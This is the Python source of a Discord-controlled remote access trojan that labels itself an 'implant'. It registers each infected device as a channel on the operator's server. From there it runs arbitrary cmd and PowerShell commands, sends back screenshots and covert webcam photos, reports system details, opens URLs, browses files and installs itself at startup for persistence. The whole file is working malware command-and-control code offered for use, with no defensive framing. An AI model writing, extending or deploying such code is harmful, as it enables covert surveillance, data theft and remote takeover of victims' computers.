import discord
import os
import socket
import asyncio
import shlex

# Import all execution modules
import command_executor as cmd
import notification_sender as notifier
import screenshot_taker as ss
import system_info as sysinfo
import web_opener
import startup_manager
import webcam_manager as wcm
import file_explorer as fe

# --- Configuration ---
TOKEN_PATH = 'token.txt'; SERVER_CATEGORY_NAME = "🔴 Live Sessions"; INSTRUCTION_PREFIX = 'EXEC_CMD:'
EMBED_COLOR = 0x2B2D31

# --- Bot Setup ---
intents = discord.Intents.default(); intents.message_content = True
client = discord.Client(intents=intents)

# --- Helpers ---
def load_token():
    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f: return f.read().strip()

def get_device_name():
    hostname = socket.gethostname(); return "".join(c for c in hostname.lower() if c.isalnum() or c == '-').strip()

# --- Core Event Handlers ---
@client.event
async def on_ready():
    print(f'Implant logged in as {client.user} on device {get_device_name()}')
    if not client.guilds: return
    guild = client.guilds[0]
    device_name = get_device_name()
    category = discord.utils.get(guild.categories, name=SERVER_CATEGORY_NAME)
    if not category:
        try: category = await guild.create_category(SERVER_CATEGORY_NAME)
        except discord.Forbidden: return
    channel = discord.utils.get(guild.text_channels, name=device_name, category=category)
    if not channel:
        try: channel = await guild.create_text_channel(device_name, category=category)
        except discord.Forbidden: return
    try:
        embed = discord.Embed(title="🟢 New Session Started", description=f"Device **{device_name}** is now online and ready for commands.", color=discord.Color.green())
        await channel.send(embed=embed)
    except discord.Forbidden: pass

@client.event
async def on_message(message):
    device_name = get_device_name()
    if message.channel.name != device_name or not message.content.startswith(INSTRUCTION_PREFIX):
        return

    content = message.content[len(INSTRUCTION_PREFIX):]
    parts = content.split(' ', 1)
    command_name = parts[0]
    args_str = parts[1] if len(parts) > 1 else ""

    try:
        if command_name == "kill":
            embed = discord.Embed(title="🔴 Session Terminated", description=f"Device **{device_name}** has been shut down via remote command.", color=discord.Color.red())
            await message.channel.send(embed=embed)
            await client.close()

        elif command_name == "runcmd":
            output = cmd.execute_command(args_str)
            if len(output) > 1980: output = output[:1980] + "\n[...TRUNCATED...]"
            embed = discord.Embed(title="📟 CMD Output", description=f"```cmd\n{output}\n```", color=EMBED_COLOR)
            await message.channel.send(embed=embed)

        elif command_name == "runpw":
            output = cmd.execute_powershell(args_str)
            if len(output) > 1980: output = output[:1980] + "\n[...TRUNCATED...]"
            embed = discord.Embed(title=" PowerShell Output", description=f"```powershell\n{output}\n```", color=EMBED_COLOR)
            await message.channel.send(embed=embed)

        elif command_name == "takescreenshot":
            ss_file = ss.take_screenshot()
            if ss_file and os.path.exists(ss_file):
                embed = discord.Embed(title="📸 Screenshot Captured", color=EMBED_COLOR); f = discord.File(ss_file, filename="screenshot.png"); embed.set_image(url="attachment://screenshot.png")
                await message.channel.send(file=f, embed=embed); os.remove(ss_file)
            else: raise Exception("Failed to create screenshot file.")

        elif command_name == "irlpicture":
            img_path = await asyncio.to_thread(wcm.capture_webcam_image)
            if img_path and os.path.exists(img_path):
                embed = discord.Embed(title="📷 Webcam Image Captured", color=EMBED_COLOR); f = discord.File(img_path, filename="webcam.png"); embed.set_image(url="attachment://webcam.png")
                await message.channel.send(file=f, embed=embed); os.remove(img_path)
            else: raise Exception("Failed to capture webcam image.")

        elif command_name == "systemspecs":
            specs = sysinfo.get_specs(); embed = discord.Embed(title=f"💻 System Specs for {device_name}", color=discord.Color.blue())
            embed.add_field(name="Operating System", value=f"{specs.get('platform', 'N/A')} {specs.get('platform_release', 'N/A')}", inline=False); embed.add_field(name="CPU", value=f"{specs.get('cpu_name', 'N/A')}", inline=False); embed.add_field(name="RAM Usage", value=f"{specs.get('ram_usage_percent', 'N/A')}% ({specs.get('ram_available', 'N/A')} of {specs.get('ram_total', 'N/A')})", inline=False)
            await message.channel.send(embed=embed)

        elif command_name == "shownotification":
            title, msg = shlex.split(args_str); success = notifier.show(title, msg)
            status_msg = "Successfully displayed notification." if success else "Failed to display notification."; embed = discord.Embed(title="🖥️ Notification Status", description=status_msg, color=discord.Color.green() if success else discord.Color.orange())
            await message.channel.send(embed=embed)

        elif command_name == "openwebsite":
            success = web_opener.open_url(args_str)
            status_msg = f"Successfully attempted to open `{args_str}`." if success else f"Failed to open `{args_str}`."; embed = discord.Embed(title="🌐 Open URL Status", description=status_msg, color=discord.Color.green() if success else discord.Color.orange())
            await message.channel.send(embed=embed)

        elif command_name == "putinstartup":
            status = startup_manager.add_to_startup()
            embed = discord.Embed(title="⚙️ Startup Status", description=f"`{status}`", color=EMBED_COLOR)
            await message.channel.send(embed=embed)

        elif command_name == "explore":
            embed = fe.create_explorer_embed(args_str)
            await message.channel.send(embed=embed)
        
    except Exception as e:
        embed = discord.Embed(title="❌ Implant Error", description=f"An error occurred on `{device_name}`:\n```py\n{e}\n```", color=discord.Color.red())
        await message.channel.send(embed=embed)

# --- Main Execution ---
if __name__ == "__main__":
    try: client.run(load_token())
    except Exception as e: print(f"Failed to start implant: {e}")